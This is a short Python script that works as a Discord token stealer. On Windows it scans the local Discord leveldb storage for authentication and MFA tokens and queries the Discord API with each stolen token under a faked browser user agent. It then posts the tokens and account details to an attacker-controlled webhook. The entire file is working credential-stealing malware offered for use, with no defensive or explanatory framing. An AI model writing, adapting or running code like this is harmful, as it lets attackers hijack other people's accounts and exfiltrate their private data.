import json
import re
import requests
import os
from dotenv import load_dotenv
import fake_useragent
import platform

load_dotenv()
WEBHOOK = os.getenv("WEBHOOK")


def steal(pt: str) -> list:
    pt = os.path.join(pt, r"discord\Local Storage\leveldb")
    tokens = []

    for file in os.listdir(pt):
        if not file.endswith(".log") and not file.endswith(".ldb"):
            continue
        else:
            with open(f"{pt}\\{file}", "r", encoding="utf-8", errors="ignore") as attrs:
                for line in attrs.readlines():
                    for pattern in [r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}']:
                        for token in re.findall(pattern, line):
                            if token is not None:
                                tokens.append(token)
    return tokens


def message() -> None:
    roaming = os.getenv("APPDATA")
    tokens = steal(roaming)

    for token in tokens:
        token_msg = f"--------------------------\n" \
                    f"@everyone\n" \
                    f"Token: {token}\n"
        payload1 = {
            "content": token_msg
        }
        payload2 = {
            "content": ""
        }

        headers = {
            'Authorization': token,
            'user-agent': fake_useragent.UserAgent().chrome
        }
        res = requests.get(
            'https://discordapp.com/api/v6/users/@me', headers=headers
        )
        for key, value in json.loads(res.text).items():
            payload2["content"] += F'{key}: {value}\n'

        try:
            requests.post(WEBHOOK, data=payload1)
            requests.post(WEBHOOK, data=payload2)
        except Exception as ex:
            payload3 = {
                "content": ex
            }
            requests.post(WEBHOOK, data=payload3)


def main():
    if platform.system().lower() == "windows":
        message()


if __name__ == '__main__':
    main()
